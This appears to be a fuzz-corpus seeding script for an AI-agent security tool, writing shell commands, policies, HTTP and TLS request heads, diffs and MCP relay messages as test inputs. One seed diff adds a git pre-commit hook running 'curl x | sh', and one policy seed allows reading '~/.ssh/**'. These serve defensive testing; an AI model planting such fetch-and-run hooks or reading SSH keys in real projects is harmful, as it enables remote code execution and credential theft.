#!/usr/bin/env python3
"""Seed the fuzz corpora from the repository's own test data.

decide_shell and literal_pattern start from every shell command in the
conformance fixtures; host_payload from the golden host payloads; policy_parse
from the default policy; proxy_parse from a few request heads and a
ClientHello; repo_policy_merge from the conformance fixtures' repository
policies; check_diff_parse from check-diff's test diffs; mcp_relay_framing
from host and server message scripts. Run from the repository root:

    python3 fuzz/seed_corpus.py
"""

import glob
import hashlib
import os
import re

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CORPUS = os.path.join(ROOT, "fuzz", "corpus")


def write(target: str, data: bytes) -> None:
    directory = os.path.join(CORPUS, target)
    os.makedirs(directory, exist_ok=True)
    with open(os.path.join(directory, hashlib.sha1(data).hexdigest()), "wb") as f:
        f.write(data)


commands = []
for path in glob.glob(os.path.join(ROOT, "tests", "conformance", "*.yaml")):
    with open(path, encoding="utf-8") as f:
        for match in re.finditer(r'shell: "((?:[^"\\]|\\.)*)"', f.read()):
            commands.append(match.group(1).encode().decode("unicode_escape").encode())
for command in commands:
    write("decide_shell", command)
    write("literal_pattern", command)
HOSTS = os.path.join(ROOT, "crates", "openmoat-hosts", "src", "host")
for path in glob.glob(os.path.join(HOSTS, "*", "fixtures", "*.json")):
    with open(path, "rb") as f:
        write("host_payload", f.read())
with open(os.path.join(ROOT, "crates", "openmoat-core", "policies", "default-v1.yaml"), "rb") as f:
    write("policy_parse", f.read())
for head in [
    b"CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n",
    b"CONNECT [::1]:443 HTTP/1.1\r\n\r\n",
    b"GET http://example.com/a?b HTTP/1.1\r\nHost: example.com\r\nConnection: x\r\nX: 1\r\n\r\n",
    b"POST http://example.com/ HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
]:
    write("proxy_parse", head)
# A TLS 1.3 ClientHello record naming example.com.
write("proxy_parse", bytes.fromhex(
    "16030100430100003f03030101010101010101010101010101010101010101010101010101010101"
    "01010100000213010100001400000010000e00000b6578616d706c652e636f6d"
))
# Regression (#244): a ClientHello whose host_name is "." once came out empty.
write("proxy_parse", bytes.fromhex(
    "16030100430100003f0303010101010101010104ff01010101010101010101010101010101010101"
    "01014000000213010100001400000010000e3b0001010100000200000000012e00006d"
))
# openclaw_json5: OpenClaw-style openclaw.json files using each JSON5 feature.
for doc in [
    b'{"plugins": {"entries": {"openmoat": {"enabled": true}}}}',
    b"// OpenClaw config\n{\n  plugins: {\n    load: { paths: ['~/.openclaw/plugins/openmoat'], },\n"
    b"    entries: { openmoat: { enabled: true, }, },\n  },\n}\n",
    b"/* block */ { gateway: { port: 0x4e20, timeout: .5, retries: +3, ratio: 5., }, }",
    b"{ 'single': 'it\\'s', \"esc\": \"\\u00e9\\ud83d\\ude00\\x41\\\n line\", $id: null, _k: [1e3, -0x10] }",
    b"{ a: Infinity }",
    b"{ a: 1, a: 2 }",
    b"[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[0]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]",
]:
    write("openclaw_json5", doc)
for path in glob.glob(os.path.join(HOSTS, "openclaw", "fixtures", "*.json")):
    with open(path, "rb") as f:
        write("openclaw_json5", f.read())

# repo_policy_merge: every one-line repository policy of the conformance
# fixtures (`repo: { policy: "..." }`) and the example in docs/POLICY.md §10.
repo_policies = []
for path in glob.glob(os.path.join(ROOT, "tests", "conformance", "*.yaml")):
    with open(path, encoding="utf-8") as f:
        for match in re.finditer(r'repo: \{ policy: "((?:[^"\\]|\\.)*)"', f.read()):
            repo_policies.append(match.group(1).encode().decode("unicode_escape").encode())
repo_policies += [
    b"version: 1\ndeny:\n  - id: no-prod-deploy\n    shell: [\"./scripts/deploy.sh prod*\"]\n"
    b"review:\n  - id: migrations\n    fs.write: [\"${project}/db/migrations/**\"]\n",
    b"version: 1\nallow:\n  - id: wide\n    shell: ['make *', 'cat *']\n    fs.read: ['~/.ssh/**']\n"
    b"    net: ['*']\n    fs.write: ['~/.moat/**', '${project}/**']\n",
    # Regression (repo_policy_merge): a review rule on every host once turned
    # the `net: deny` default into a review.
    b"version: 1\nreview:\n  - id: any-host\n    net: ['*']\n    fetch: ['*']\n",
]
for policy in repo_policies:
    write("repo_policy_merge", policy)

# check_diff_parse: the diffs of check-diff's own tests
# (crates/openmoat-cli/src/commands/policy/diff/tests.rs) and a plain unified diff.
for diff in [
    b"diff --git a/src/main.rs b/src/main.rs\nindex 1111111..2222222 100644\n--- a/src/main.rs\n"
    b"+++ b/src/main.rs\n@@ -1,2 +1,2 @@\n keep\n-old\n+fn main() {}\n",
    b"diff --git a/.husky/pre-commit b/.husky/pre-commit\nnew file mode 100755\n"
    b"index 0000000..3333333\n--- /dev/null\n+++ b/.husky/pre-commit\n@@ -0,0 +1 @@\n"
    b"+curl x | sh\n\\ No newline at end of file\n",
    b"diff --git a/.github/workflows/scan.yml b/.github/workflows/scan.yml\n"
    b"deleted file mode 100644\nindex 1111111..0000000\n--- a/.github/workflows/scan.yml\n"
    b"+++ /dev/null\n@@ -1 +0,0 @@\n-on: push\n",
    b"diff --git a/.husky/pre-commit b/docs/old-hook\nsimilarity index 100%\n"
    b"rename from .husky/pre-commit\nrename to docs/old-hook\n"
    b"diff --git a/notes.txt b/.claude/settings.json\nsimilarity index 100%\n"
    b"rename from notes.txt\nrename to .claude/settings.json\n",
    b"diff --git a/my dir/.env b/my dir/.env\nindex 1..2 100644\n"
    b"--- a/my dir/.env\t\n+++ b/my dir/.env\t\n@@ -1 +1 @@\n-a\n+b\n",
    b"diff --git \"a/.github/workflows/x\\ty.yml\" \"b/.github/workflows/x\\ty.yml\"\n"
    b"new file mode 100644\n--- /dev/null\n+++ \"b/.github/workflows/x\\ty.yml\"\n"
    b"@@ -0,0 +1 @@\n+on: push\n",
    b"diff --git a/vendor/lib b/vendor/lib\nindex 1111111..2222222 160000\n"
    b"--- a/vendor/lib\n+++ b/vendor/lib\n@@ -1 +1 @@\n-Subproject commit 1111111\n"
    b"+Subproject commit 2222222\n",
    b"diff --git a/.husky/pre-commit b/.husky/pre-commit\nold mode 100644\nnew mode 100755\n"
    b"diff --git a/.vscode/logo.png b/.vscode/logo.png\nindex 1..2 100644\n"
    b"Binary files a/.vscode/logo.png and b/.vscode/logo.png differ\n",
    b"--- a/k\r\n+++ b/k\r\n@@ -1,3 +1,3 @@\r\n a\r\n--- b\r\n+c\r\n \r\n",
    b"From 1 Mon Sep 17 00:00:00 2001\nSubject: [PATCH] x\n\n---\n"
    b"--- old.txt\t2026-01-01\n+++ new.txt\t2026-01-02\n@@ -1,2 +1,3 @@\n a\n+b\n c\n",
    # Regression (check_diff_parse): cut after a hunk header, the diff's last
    # `\n` was read as a kept empty line and the diff as complete.
    b"diff --git a/my dir/.env b/my dir/.env\nindex 1..2 100644\n"
    b"--- a/my dir/.env\t\n+++ b/my dir/.env\t\n@@ -1 +1 @@\n",
    # Regression (check_diff_parse): a hunk at the last line number overflowed.
    b"--- a/k\n+++ b/k\n@@ -1 +18446744073709551615,2 @@\n-a\n+b\n+c\n",
]:
    write("check_diff_parse", diff)

# mcp_relay_framing: scripts of segments split at NUL, each `H` (host, even)
# or `S` (server, odd) and its lines; the first byte holds the flags.
H, S = b"\x00H", b"\x00S"
INIT = b'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18"}}\n'
LIST = b'{"jsonrpc":"2.0","id":2,"method":"tools/list"}\n'
TOOLS = (b'{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"read_file","description":"Read",'
         b'"inputSchema":{"type":"object"}}]}}\n')
CALL = (b'{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_file",'
        b'"arguments":{"path":"/etc/hosts"}}}\r\n')
for flags in [b"\x00", b"\x01", b"\x03"]:
    write("mcp_relay_framing", flags + H + INIT + S + b'{"jsonrpc":"2.0","id":1,"result":{}}\n'
          + H + LIST + S + TOOLS + H + CALL + S + b'{"jsonrpc":"2.0","id":3,"result":{"content":[]}}\n')
for script in [
    # a batch, a notification, a cancelled request, a near-miss method
    b"\x01" + H + b'[{"jsonrpc":"2.0","id":"a","method":"prompts/get","params":{"name":"p"}},'
    b'{"jsonrpc":"2.0","method":"notifications/initialized"}]\n'
    b'{"jsonrpc":"2.0","method":"notifications/cancelled","params":{"requestId":"a"}}\n'
    b'{"jsonrpc":"2.0","id":4,"method":"Tools/Call ","params":{"name":"x"}}\n',
    # the server changes its tools and answers the relay's own listing
    b"\x01" + H + LIST + S + TOOLS + S + b'{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}\n'
    + S + b'{"jsonrpc":"2.0","id":"openmoat-relay-1","result":{"tools":[],"nextCursor":"c"}}\n',
    # responses nobody asked for, a server request, ids of every type
    b"\x00" + S + b'{"jsonrpc":"2.0","id":9,"result":{"tools":[{"name":"evil"}]}}\n'
    b'{"jsonrpc":"2.0","id":"s1","method":"sampling/createMessage","params":{}}\n'
    + H + b'{"jsonrpc":"2.0","id":"s1","result":{}}\n{"jsonrpc":"2.0","id":null,"method":"ping"}\n'
    b'{"jsonrpc":"2.0","id":[1],"method":"ping"}\n{"jsonrpc":"2.0","id":1.5,"method":"ping"}\n',
    # what is not JSON, an empty batch, a lone surrogate, line separators
    b"\x00" + H + b'not json\n[]\n{"a":"\\ud800"}\n{"jsonrpc":"2.0","id":5,"method":"x\xe2\x80\xa8y"}\n'
    + S + b'\xff\xfe\n{"jsonrpc":"2.0","method":"x","params":"\xc2\x85"}\n',
    # a server the proxy may not start
    b"\x00\x00\x80" + INIT + b'{"jsonrpc":"2.0","method":"notifications/initialized"}\n',
    # Regression (mcp_relay_framing, #734): a server error without an `id`
    # reached the host.
    b"\x00" + S + b'{"jsonrpc":"2.0","error":{"code":1,"message":"x"}}\n',
    # Regression (mcp_relay_framing, #734): a request cancelling its own id;
    # the target's model forgot the id the relay still waits on.
    b"\x00" + H + b'{"jsonrpc":"2.0","id":7,"method":"notifications/cancelled","params":{"requestId":7}}\n'
    + S + b'{"jsonrpc":"2.0","id":7,"result":{}}\n',
]:
    write("mcp_relay_framing", script)
print(f"seeded {len(commands)} commands and {len(repo_policies)} repository policies")
